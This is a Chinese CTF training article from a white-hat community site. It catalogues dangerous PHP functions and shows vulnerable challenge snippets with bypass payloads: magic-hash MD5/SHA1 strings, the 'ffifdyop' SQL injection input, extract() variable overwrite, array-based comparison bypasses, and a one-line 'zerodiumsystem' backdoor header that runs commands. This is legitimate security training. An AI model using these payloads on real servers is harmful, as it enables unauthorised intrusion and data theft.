> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Hlk5lXwbaDTmfxOLbFIATg)

**作者：tzzzez** 编辑：白帽子社区运营团队  

  

  

    " 白帽子社区在线 CTF 靶场 BMZCTF，欢迎各位在这里练习、学习，BMZCTF 全身心为网络安全赛手提供优质学习环境，链接（http://www.bmzclub.cn/）

"    

* * *

在 php 中可由用户输入的变量
----------------

```
$_SERVER
$_GET
$_POST
$_COOKIE
$_REQUEST
$_FILES
```

存在命令注入的函数
---------

```
system
exec
passthru
shell_exec
popen
proc_open
pcntl_exec
```

存在 XSS 和 CSRF 的函数  

```
echo
print
printf
vprintf
<%=$test%>
```

存在文件包含的函数  

```
include
include_once
require
require_once
show_source
highlite_file
readfile
flie_get_contents
fopen
```

存在代码注入的函数
---------

```
eval
preg_replace
assert
call_user_func
call_user_func_array
create_function
```

存在 SQL 注入的语句  

```
insert
update
select
delete
```

文件管理函数  

```
copy
rmdir
unlink
delete
fwrite
chmod
fgetc
fgetcsv
fgets
fgetss
file
file_get_contents
fread
readfile
ftruncate
file_put_contents
fputcsv
fputs
```

对于此类函数，可以使用 php 伪协议进行一个绕过。  

<table cellpadding="0" cellspacing="0" width="1516" height="NaN"><tbody><tr><td width="1501" height="NaN"><section><pre data-lang="xml" class="hljs xml">&lt;?php
$a=$_GET['a'];
if(stripos($a,'.'))
{
    echo 'no';
    return ;
}
$data = @file_get_contents($a,'r');
if($data=="WHT is a good family!")
{
    require("flag.txt");
    echo "flag";
}
?&gt;</pre></section><code></code></td></tr></tbody></table>

GET 形式传入参数 a，a 不能含有.，且变量 a 必须为 WHT is a good family!

使用 php 伪协议进行一个传参。

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G6WMZWYYKSRDcD4hw0tkOvRFNBmGSkhRs9VQzjtr2nxmmx9YUg97fFwnwDZXicPia1uov8zI3vM6BBg/640?wx_fmt=png)

文件上传函数
------

```
move_uploaded_file
```

变量覆盖函数
------

```
extract
```

<table cellpadding="0" cellspacing="0" width="1516" height="NaN"><tbody><tr><td width="1501" height="NaN"><section><pre data-lang="xml" class="hljs xml">&lt;?php
 
$flag='flag.txt';
extract($_GET);
 if(isset($a))
 {
    $content=trim(file_get_contents($flag));
    //将flag文件的内容赋值给content变量
    if($a==$content)
    {
        echo'ctf{xxx}';
    }
   else
   {
    echo'no';
   }
   }
 
?&gt;</pre></section></td></tr></tbody></table>

"extract($_GET)" 此函数将 GET 传入的参数都重新赋值了， $content 的值为 flag.txt 的内容，只有 a 和 content 的值相等时，才会输出 flag，所以将 $flag 赋值一个不存在的文件，那么 $content 的值也就为空，此时 $content 也就变的可控了。

POC:

```
a=&flag=tzzzez
```

Session 绕过
----------

<table cellpadding="0" cellspacing="0" width="1516" height="NaN"><tbody><tr><td width="1501" height="NaN"><section><pre data-lang="perl" class="hljs xml">&lt;?php
 
$flag = "flag{xxxx}";
 
session_start();
if (isset ($_GET['password'])) {
    if ($_GET['password'] == $_SESSION['password'])
        die ('Flag: '.$flag);
    else
        print 'Wrong';
}
mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));
?&gt;</pre></section></td></tr></tbody></table>

Session 的 password 在未登陆时为空，我们只要上传一个空的 paasword 即可绕过。

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G6WMZWYYKSRDcD4hw0tkOvR5tg2kynFcGCeYqr2cibepd08jbgSCambrKYD74RwYtKiafrWWfX84r2g/640?wx_fmt=png)

比较相等绕过
------

```
MD5
md5('240610708')==md5('QNKCDZO')
md5('aabg7XSs')==md5('aabC9RqS')
SHA1
sha1('aaroZmOk')==sha1('aaK1STfY')
sha1('aaO8zKZF')==sha1('aa3OFF9m')
明文
'0010e2'=='1e3'
'0x1234Ab'=='1193131'
'0xABCdef'==' 0xABCdef'
```

弱类型整型比较
-------

<table cellpadding="0" cellspacing="0" width="1516" height="NaN"><tbody><tr><td width="1501" height="NaN"><section><pre data-lang="xml" class="hljs xml">&lt;?php
 
error_reporting(0);
$flag = "flag{test}";
 
$temp = $_GET['password'];
is_numeric($temp)?die("no numeric");   
if($temp&gt;1336){
    echo $flag;
}
 
?&gt;</pre></section><code></code></td></tr></tbody></table>

当一个整形和一个其他类型行比较的时候，会先把其他类型 intval 再比。

POC：

```
password=1377a
```

MD5 函数 true 绕过
--------------

<table cellpadding="0" cellspacing="0" width="1516" height="NaN"><tbody><tr><td width="1501" height="NaN"><section><pre data-lang="bash" class="hljs bash">$password = $_GET['password'];
$sql&nbsp;=&nbsp;"SELECT&nbsp;*&nbsp;FROM&nbsp;users&nbsp;WHERE&nbsp;password&nbsp;=&nbsp;'".md5($password,true)."'";</pre></section><code></code></td></tr></tbody></table>

ffifdyop  
129581926211651571912466741651878684928

preg_match 绕过
-------------

    1. 数组绕过  
    2. 回溯次数限制绕过  
    3. 添加换行符 \n 和 %0a

strpos() 绕过
-----------

    strpos() 找的是字符串, 那么传一个数组给它, strpos() 出错返回 null。

sha1() 绕过
---------

<table cellpadding="0" cellspacing="0" width="1516" height="NaN"><tbody><tr><td width="1501" height="NaN"><section><pre data-lang="xml" class="hljs xml">&lt;?php
 
$flag = "flag{xxxx}";
 
if (isset($_GET['name']) and isset($_GET['password']))
{
    if ($_GET['name'] == $_GET['password'])
        echo 'Your password can not be your name!';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo 'Invalid password.';
}
else
    echo 'Login first!';
?&gt;</pre></section><code></code></td></tr></tbody></table>

需要构造一对哈希值相等但明文不同的字符串，这里 sha1 函数无法处理数组，当处理数组时会报错返回 False，这样就使得 2 个参数的哈希值 “相等”，这里传参 2 个不同的数组即可绕过所有 if。

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G6WMZWYYKSRDcD4hw0tkOvRnibDb3iaULYnVwkc2cJ7Y11jb6JdiaCUyrM7ZeWJ55qS5QRzQBpVZodxg/640?wx_fmt=png)

MD5 碰撞
------

PHP 在处理哈希字符串时，会利用”!=” 或”==” 来对哈希值进行比较，它把每一个以”0E” 开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E” 开头的，那么 PHP 将会认为他们相同，都是 0。  

```
0e开头的md5和原值：
QNKCDZO
0e830400451993494058024219903391
QNKCDZO
0e830400451993494058024219903391
0e462097431906509019562988736854
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
```

PHP 版本存在漏洞的函数  

```
User-Agentt: zerodiumsystem("cat /flag");
```

值不等 MD5 相等，用两个不能 MD5 转换的值就可以。  

传数组，strcmp() 用两个无法比较的值，数组和字符串不可比较。
----------------------------------

往期精彩文章

  

  

  

  

[MISC 中常用 python 脚本](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247493219&idx=1&sn=e10fc572a53770f86dc1e31afc504b1a&chksm=f9e3f0f2ce9479e48ea4237b33cc7e5f22f1d6d093e68f270dd0d9e6fb333640cc66ea3b850b&scene=21#wechat_redirect)  

[第五空间网络安全大赛 WHT WRITEUP](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247493179&idx=1&sn=312b38fb68c29f510f1dfc4f2c7d0c55&chksm=f9e3f0aace9479bc2eac3b749dc7675e7b8a9a87bea3d4b600b1aa1c087d5b30872367a8af29&scene=21#wechat_redirect)  

[羊城杯 - WP](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247493096&idx=1&sn=a831d82dea152fb5ff5c1d4bbd987b71&chksm=f9e3f379ce947a6f3e04108c9f3a6fd6768903745b6051ab9f188e6f717c068ff42b6429e103&scene=21#wechat_redirect)  

[工作中最常用的 Linux 命令，排查问题必备](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247492963&idx=1&sn=c120ac36b437e6ad2e8e4472b3f7a9bd&chksm=f9e3f3f2ce947ae44385fcf06f02b90f138be8759c465799e34f623e1ebe7058306f8a7340c6&scene=21#wechat_redirect)  

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/HQn53QYo2G6qibBGYUpMN61OzcccFkm56YqORO7w7y37jvy8e6Mj2DbBzkoIee5HNFnDlzsek47QJmmCgRMTwYw/640?wx_fmt=jpeg)

_技术支持：白帽子社区团队_

_—_ 扫码关注我们 _—_